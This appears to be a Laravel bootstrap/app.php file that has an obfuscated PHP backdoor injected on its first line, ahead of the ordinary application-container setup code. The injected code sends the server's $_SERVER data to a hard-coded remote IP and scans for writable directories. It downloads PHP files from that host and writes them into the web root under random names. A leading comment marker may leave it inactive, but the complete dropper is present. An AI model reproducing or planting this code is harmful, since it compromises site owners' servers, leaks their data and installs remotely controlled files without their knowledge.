<?php //if(!@$incode!=false||!@$incode!=null){$vl='u1';$serverid='2dfaa96adb04f4bd88a0255041764928';$liillilllil=time();function lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill){if(ini_get('allow_url_fopen')==1):$lillillliiili=stream_context_create(array('http'=>array('method'=>'POST','header'=>array('Content-type: application/x-www-form-urlencoded'),'content'=>http_build_query($_SERVER))));if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=fopen';endif;$lliiilliiill=@file_get_contents($lliiiilllill,false,$lillillliiili);elseif(in_array('curl',get_loaded_extensions())):if($lilillilllllill=='yes'):$lliiiilllill=$lliiiilllill.'&type=curl';endif;$llillilliili=curl_init();curl_setopt($llillilliili,CURLOPT_URL,$lliiiilllill);curl_setopt($llillilliili,CURLOPT_HEADER,false);curl_setopt($llillilliili,CURLOPT_RETURNTRANSFER,true);curl_setopt($llillilliili,CURLOPT_POSTFIELDS,http_build_query($_SERVER));$lliiilliiill=@curl_exec($llillilliili);curl_close($llillilliili);else:if($lilillilllllill=='yes'):$lililliiiillill=$lililliiiillill.'&type=socks';endif;$lllliiililii=fsockopen($lliiilliiilii,80,$liiiillllillili,$llllililllll,10);if($lllliiililii):$lilllliiiiiiii=http_build_query($_SERVER);$lilliillllllli='POST '.$lililliiiillill.' HTTP/1.0'."\r\n";$lilliillllllli.='Host: '.$lliiilliiilii."\r\n";$lilliillllllli.='Content-Type: application/x-www-form-urlencoded'."\r\n";$lilliillllllli.='Content-Length: '.strlen($lilllliiiiiiii)."\r\n\r\n";fputs($lllliiililii,$lilliillllllli);fputs($lllliiililii,$lilllliiiiiiii);$llliiiliili='';while(!feof($lllliiililii)):$llliiiliili.=fgets($lllliiililii,4096);endwhile;fclose($lllliiililii);list($liiillllillll,$lillllllillllli)=@preg_split("/\R\R/",$llliiiliili,2);$lliiilliiill=$lillllllillllli;endif;endif;return$lliiilliiill;}function liiiiiillilill($lliililllli){$lliillliliii=array();$lliillliliii[]=$lliililllli;foreach(scandir($lliililllli) as$liililililllil):if($liililililllil=='.'||$liililililllil=='..'):continue;endif;$lllllllillii=$lliililllli.DIRECTORY_SEPARATOR.$liililililllil;if(is_dir($lllllllillii)):$lliillliliii[]=$lllllllillii;$lliillliliii=array_merge($lliillliliii,liiiiiillilill($lllllllillii));endif;endforeach;return$lliillliliii;}$lililliiiillill='/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$lilliliiillliil='204';$liiililillllil='217';$liliiillili='12';$liliiiillill='250';$lliiilliiilii=$liiililillllil.'.'.$liliiillili.'.'.$lilliliiillliil.'.'.$liliiiillill;$lliiiilllill='http://'.$lliiilliiilii.'/handlers/spiderhandler.php?checkdomain&time='.$liillilllil;$llliiiiiilili=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='yes');if($llliiiiiilili!='havedoor|havedonor'):if($llliiiiiilili!='needtowait'):$liiiiiiiilii=@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']);$liiiililllli=$_SERVER['DOCUMENT_ROOT'];chdir($liiiililllli);$lliillliliii=liiiiiillilill($liiiililllli);$lliillliliii=array_unique($lliillliliii);foreach($lliillliliii as$liililililllil):if(is_dir($liililililllil)&&is_writable($liililililllil)):$lillliiliilli=explode(DIRECTORY_SEPARATOR,$liililililllil);$llilliliilil=count($lillliiliilli);$lilililllllilll[]=$llilliliilil.'|'.$liililililllil;endif;endforeach;$llilliliilil=0;foreach($lilililllllilll as$llliiiiiiii):if(count($lilililllllilll)>1&&(strstr($llliiiiiiii,'/wp-admin')||strstr($llliiiiiiii,'/cgi-bin'))):unset($lilililllllilll[$llilliliilil]);endif;$llilliliilil++;endforeach;if(!is_writable($liiiililllli)):natsort($lilililllllilll);$lilililllllilll=array_values($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];else:$llliiiiiiii=$liiiililllli;endif;chdir($llliiiiiiii);if(strstr($llliiiiiilili,'|')):$llliliiilll=explode('|',$llliiiiiilili);$liiililiilii=$llliliiilll[0];$liiiilllllli=$llliliiilll[1];if($liiililiilii=='nodoor'):$lliiiilllill='http://'.$lliiilliiilii.'/handlers/update.php?vl='.$vl.'&upd&needfilename';$lililliiiillill='/handlers/update.php?vl='.$vl.'&upd&needfilename';$liililliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');$lilliliiiilllil=explode('|||||',$liililliiill);$lllliiliiiii=$lilliliiiilllil[0].'.php';$lliillilllliii=$lilliliiiilllil[1];file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliillilllliii);$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliiiilllill='http://'.@preg_replace('/^www\./','',$_SERVER['HTTP_HOST']).$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$lililliiiillill=$llililiillll.'/'.$lllliiliiiii.'?gen&serverid='.$serverid;$liiiilillilliil=lillliilliii($lliiiilllill,$_SERVER['HTTP_HOST'],$lililliiiillill,$lilillilllllill='no');endif;if($liiiilllllli=='nodonor'):endif;elseif($llliiiiiilili=='needtoloadsomefiles'):shuffle($lilililllllilll);$llliiiiiiii=explode('|',$lilililllllilll[0]);$llliiiiiiii=$llliiiiiiii[1];$llililiillll=str_replace($liiiililllli,'',$llliiiiiiii);$lliliiilill='stuvwxyz';$lllliiliiiii=str_shuffle($lliliiilill).'.php';$llllllilliil=urlencode('http://'.$liiiiiiiilii.$llililiillll.'/'.$lllliiliiiii);$lliiiilllill='http://'.$lliiilliiilii.'/handlers/getback.php?url='.$llllllilliil;$lililliiiillill='/handlers/getback.php?url='.$llllllilliil;$lliiilliiill=lillliilliii($lliiiilllill,$lliiilliiilii,$lililliiiillill,$lilillilllllill='no');file_put_contents($llliiiiiiii.DIRECTORY_SEPARATOR.$lllliiliiiii,$lliiilliiill);endif;endif;endif;$liiiiliiill=true;$incode=true;}?><?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/

$app = new Illuminate\Foundation\Application(
    realpath(__DIR__.'/../')
);

/*
|--------------------------------------------------------------------------
| Bind Important Interfaces
|--------------------------------------------------------------------------
|
| Next, we need to bind some important interfaces into the container so
| we will be able to resolve them when needed. The kernels serve the
| incoming requests to this application from both the web and CLI.
|
*/

$app->singleton(
    Illuminate\Contracts\Http\Kernel::class,
    App\Http\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Console\Kernel::class,
    App\Console\Kernel::class
);

$app->singleton(
    Illuminate\Contracts\Debug\ExceptionHandler::class,
    App\Exceptions\Handler::class
);

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/

return $app;
